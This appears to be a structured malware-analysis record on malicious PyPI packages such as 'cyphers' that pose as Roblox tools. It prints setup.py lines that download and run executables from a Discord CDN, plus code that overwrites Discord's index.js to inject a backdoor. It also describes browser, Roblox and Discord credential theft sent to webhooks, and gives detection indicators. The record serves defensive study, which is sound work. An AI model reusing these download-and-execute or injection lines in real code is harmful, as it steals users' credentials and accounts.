package_info.package_name: cyphers (and related: rbxtool, rbxotools, rblxtools, pippytests, pippytest, testpipperz, testpipper, plutos, stealthpy, hackerfilelol, hackerfileloll)
package_info.package_versions: All versions released August 1, 2022 (or July 31, 2022 for some)
package_info.why_malicious: These packages masquerade as Roblox tools, thread management, or hacking modules but contain no legitimate functionality. Instead, they install password-stealing malware that exfiltrates sensitive data from browsers, Discord, and Roblox, and injects a persistent backdoor into the Discord client.

malicious_snippets.code_snippet:
os.system('curl -o ZYXMN.exe https://cdn.discordapp.com/attachments/.../ZYXMN.exe && ZYXMN.exe')
os.system('curl -o ZYRBX.exe https://cdn.discordapp.com/attachments/.../ZYRBX.exe && ZYRBX.exe')
malicious_snippets.code_behavior: Downloads and executes two Windows executables (ZYXMN.exe and ZYRBX.exe) from a Discord CDN server.

malice_analysis.why_suspicious: setup.py should not download and execute binaries from external sources, especially from Discord CDN.
malice_analysis.violated_expectations: Normal setup.py scripts only install Python dependencies, not arbitrary binaries.
malice_analysis.similar_legitimate_use: Rarely, a package might download a dependency, but never an unsigned binary from a CDN.
key_indicators: Downloads executable files from Discord CDN

malicious_snippets.code_snippet:
with open((self.get_core(dir)[0] + '\\index.js'), 'w', encoding='utf-8') as f:
    f.write(self.code.replace('discord_desktop_core-1', self.get_core(dir)[1]))
malicious_snippets.code_behavior: Overwrites the Discord client's index.js file to inject a malicious JavaScript backdoor (Discord-Injection script).

malice_analysis.why_suspicious: Modifying application files to inject code is a classic persistence and backdoor technique.
malice_analysis.violated_expectations: No legitimate package should alter third-party application code, especially for Discord.
malice_analysis.similar_legitimate_use: Some mods or plugins patch client code, but never via a PyPI package without user consent.

malicious_snippets.code_snippet: Steals browser data: decrypts browser master key, extracts passwords, cookies, credit cards, uploads to Discord webhook
malicious_snippets.code_behavior: Steals sensitive data from Chrome, Edge, Firefox, Opera, including passwords, cookies, and credit cards, and exfiltrates via Discord webhook.

malice_analysis.why_suspicious: Accessing and exfiltrating browser data is a hallmark of info-stealing malware.
malice_analysis.violated_expectations: No legitimate tool should access or transmit browser secrets.

malicious_snippets.code_snippet: Steals Roblox account cookie, user ID, Robux balance, Premium status, uploads to Discord webhook
malicious_snippets.code_behavior: Extracts Roblox account credentials and status, exfiltrates to Discord webhook.

malice_analysis.why_suspicious: Harvesting and exfiltrating Roblox credentials is clear malicious behavior.
malice_analysis.violated_expectations: No legitimate package should access or transmit Roblox account data.

execution_context.trigger: runtime (after Discord client restart, via injected JS)

malicious_snippets.code_snippet: Injected JS steals Discord tokens, Nitro status, billing info, credit cards, and sends to Discord webhook
malicious_snippets.code_behavior: Backdoors Discord client to steal authentication tokens and sensitive user data.

malice_analysis.why_suspicious: Stealing tokens and billing info from Discord is highly malicious.
malice_analysis.violated_expectations: No legitimate Discord mod or plugin should exfiltrate user secrets.

attack_chain.action: User installs malicious PyPI package (e.g., cyphers).
attack_chain.leads_to: Malware binaries are downloaded and executed.
Browser, Discord, and Roblox data are harvested.

attack_chain.action: Discord client is modified to inject persistent JavaScript backdoor.
attack_chain.leads_to: Discord client becomes a persistent info-stealing backdoor.

attack_chain.action: Harvested data (browser, Discord, Roblox) is exfiltrated to attacker via Discord webhook.

behavioral_signatures: setup.py downloads and executes Windows binaries from Discord CDN
Overwriting Discord client index.js with injected JavaScript
Exfiltration of browser/Discord/Roblox data to Discord webhooks
file_indicators: setup.py containing os.system or subprocess calls to download .exe files
Presence of ZYXMN.exe, ZYRBX.exe, or Main.exe in user directories
Modified index.js under discord_desktop_core in Discord installations
network_indicators: Outbound connections to cdn.discordapp.com for binary downloads
Outbound HTTP POSTs to Discord webhook URLs
detection_knowledge.how_to_detect: Monitor for PyPI package installations that trigger downloads of .exe files from Discord CDN. Flag any modifications to Discord client's index.js file, especially those injecting new JavaScript. Detect outbound connections to Discord webhooks containing browser, Discord, or Roblox data. Alert on the presence of ZYXMN.exe, ZYRBX.exe, or Main.exe in user directories.
